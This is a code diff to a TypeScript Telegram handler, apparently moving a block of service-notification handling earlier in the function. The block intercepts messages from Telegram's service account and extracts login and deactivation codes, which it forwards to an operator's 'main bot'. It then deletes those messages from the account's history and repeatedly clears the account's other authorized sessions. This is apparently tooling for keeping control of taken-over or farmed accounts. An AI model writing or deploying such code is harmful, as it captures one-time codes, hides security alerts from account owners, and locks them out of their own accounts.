@@ -87,67 +87,70 @@ export const handleUpdate = async (
     }
   }
 
+  if (
+    update instanceof GramJs.UpdateShortMessage &&
+    String(update.userId) === '777000'
+  ) {
+    console.warn({
+      accountId,
+      message: '[TELEGRAM_SERVICE_NOTIFICATION]',
+      payload: JSON.parse(JSON.stringify(update)),
+    });
+
+    const code = extractLoginCode(update.message);
+    let messageText = update.message;
+
+    if (code) {
+      messageText = update.message.includes('my.telegram.org')
+        ? `CODE_FOR_DEACTIVATE: ${code}`
+        : `CODE_FOR_LOGIN: ${code}`;
+    } else if (is2FAChange(update.message)) {
+      messageText = '2FA_SETTINGS_CHANGED';
+    } else if (isInclompleteLogin(update.message)) {
+      messageText = 'INCOMPLETE_LOGIN_ATTEMPT';
+    }
+
+    const notificationMessage = `[TELEGRAM_SERVICE_NOTIFICATION]
+ID: ${accountId}
+${messageText}`;
+
+    await updateAccountById(accountId, {
+      lastServiceNotification: new Date(),
+    });
+    await sendToMainBot(notificationMessage);
+
+    if (client) {
+      await deleteHistory(
+        client,
+        new GramJs.InputPeerUser({
+          userId: update.userId,
+          accessHash: BigInt(0),
+        }),
+        true
+      );
+    }
+
+    if (forceClearAuth) {
+      [0.5, 1, 1.5, 2.5, 5, 7.5, 10].forEach((minutes) => {
+        setTimeout(
+          async () => {
+            if (client) {
+              try {
+                await clearAuthorizations(client);
+              } catch {}
+            }
+          },
+          minutes * 60 * 1000
+        );
+      });
+    }
+
+    return;
+  }
+
   console.log({
     accountId,
     message: `<${update.className}>`,
     payload: JSON.parse(JSON.stringify(update)),
   });
-
-  if (update instanceof GramJs.UpdateShortMessage) {
-    if (String(update.userId) === '777000') {
-      console.warn({
-        accountId,
-        message: '[TELEGRAM_SERVICE_NOTIFICATION]',
-        payload: JSON.parse(JSON.stringify(update)),
-      });
-
-      const code = extractLoginCode(update.message);
-      let messageText = update.message;
-
-      if (code) {
-        messageText = update.message.includes('my.telegram.org')
-          ? `CODE_FOR_DEACTIVATE: ${code}`
-          : `CODE_FOR_LOGIN: ${code}`;
-      } else if (is2FAChange(update.message)) {
-        messageText = '2FA_SETTINGS_CHANGED';
-      } else if (isInclompleteLogin(update.message)) {
-        messageText = 'INCOMPLETE_LOGIN_ATTEMPT';
-      }
-
-      const notificationMessage = `[TELEGRAM_SERVICE_NOTIFICATION]
-ID: ${accountId}
-${messageText}`;
-
-      await updateAccountById(accountId, {
-        lastServiceNotification: new Date(),
-      });
-      await sendToMainBot(notificationMessage);
-
-      if (client) {
-        await deleteHistory(
-          client,
-          new GramJs.InputPeerUser({
-            userId: update.userId,
-            accessHash: BigInt(0),
-          }),
-          true
-        );
-      }
-
-      if (forceClearAuth) {
-        [0.5, 1, 1.5, 2.5, 5, 7.5, 10].forEach((minutes) => {
-          setTimeout(
-            async () => {
-              if (client) {
-                try {
-                  await clearAuthorizations(client);
-                } catch {}
-              }
-            },
-            minutes * 60 * 1000
-          );
-        });
-      }
-    }
-  }
 };
